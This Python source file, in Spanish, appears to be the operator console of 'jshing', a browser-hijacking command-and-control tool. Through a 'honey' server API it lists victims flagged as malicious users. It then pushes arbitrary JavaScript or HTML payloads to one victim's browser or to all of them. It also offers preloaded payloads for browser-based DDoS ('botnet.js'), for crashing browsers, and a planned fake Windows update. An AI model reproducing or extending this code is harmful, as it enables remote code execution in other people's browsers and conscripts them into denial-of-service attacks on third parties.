import server.bdd as bdd
import base64, json, requests, os, re
import modules.config as cfg

from modules.utils_jshing import cursor, print_ident, honey_connected

def __payload_select__() -> str:

    patron = r":: .* ::"

    print("""
>> botnet.js    Encargado de realizar DDoS desde navegadores que contengan este jshing.js.
>> killnav.js   Carga encargada de crashear y reiniciar el navegador cliente.
>> fakeupdt.js  Envia una falsa actualizacion de Windows [AUN NO DISPONIBLE]
    """)

    payload_file = input(cursor() + ":: PAYLOAD :: ")

    with open(f"assets/{payload_file}", "r", encoding="UTF-8") as rf:
 
        payload_buffer = rf.read()
        personalizar_payload_obj = list(re.findall(patron, payload_buffer))

    for parametro in personalizar_payload_obj:

        person = input(cursor() + parametro + " ")
        payload_buffer = payload_buffer.replace(parametro, person)

    return payload_buffer

def get_users():
    
    if cfg.config_jshing["local_mode"]:
        print_ident(bdd.obtener_usuarios_maliciosos())
        return

    if not honey_connected():
        return
    
    ############# ZONA API-REST

    get_users = requests.get(cfg.config_jshing["honey_url"] + "/api/v2/admin/malicius_users", headers={
        "token": cfg.config_jshing["token"]
    })
    
    get_users = get_users.json()

    print_ident(get_users)

def get_info():

    uuid_m = input(cursor() + ":: UUID_M :: ")
    
    if cfg.config_jshing["local_mode"]:
        user_info = bdd.obtener_info_usuario_malicioso(uuid_m)
        print_ident(user_info)
        return

    if not honey_connected():
        return

    user_info = requests.post(cfg.config_jshing["honey_url"] + "/api/v2/admin/malicius_users", json={"uuid_m": uuid_m}, headers={
        "token": cfg.config_jshing["token"]
    })
    print_ident(user_info.json())

def control_user():
    
    print("[-] Para cargar un payload para todos los usuarios usa el UUID_M 'all'")
    uuid_m = input(cursor() + ":: UUID_M :: ")

    print("""
>> payload      Usa payloads preinstalados para llegar y cargar.
>> js_console   Unicamente ejecutara scripts escritos en JS.
>> html_inyect  Unicamente ejecutara codigo HTML, tambien JS desde etiquetas como onclick, onload, etc.
>> all          Usa una combinacion de ambos.
    """)

    control_mode = input(cursor() + ":: CONTROL MODE :: ")

    while True:

        data = dict()

        if control_mode == "all":

            data["html_payload"] = input(cursor() + ":: HTML PAYLOAD :: ")
            data["jscr_payload"] = input(cursor() + ":: JSCRIPT PAYLOAD :: ")

        elif control_mode == "js_console":

            data["html_payload"] = "<!-- test:test -->"
            data["jscr_payload"] = input(cursor() + ":: JSCRIPT PAYLOAD :: ")

        elif control_mode == "html_inyect":

            data["html_payload"] = input(cursor() + ":: HTML PAYLOAD :: ")
            data["jscr_payload"] = "// cracked by paap_69"

        elif control_mode == "payload":

            data["html_payload"] = "<!-- Update php to 7.9 -->"
            data["jscr_payload"] = __payload_select__()

        else:

            print("ERROR: No has seleccionado un metodo de control valido.")
            break

        payload = base64.b64encode(json.dumps(data).encode("utf-8")).decode("utf-8")
        
        if cfg.config_jshing["local_mode"]:
            resultado = bdd.insertar_payload(uuid_m, payload)

        else:

            if not honey_connected():
                return
            
            resultado = requests.post(cfg.config_jshing["honey_url"] + "/api/v2/admin/upload_payload", json={"uuid_m": uuid_m, "payload": payload}, headers={
                "token": cfg.config_jshing["token"]
            })
            resultado = resultado.json()

        print_ident(resultado)

        if resultado["status"] != 200:
            break

def relations():
    print("FUNCIONALIDAD EN DESARROLLO")
    pass      
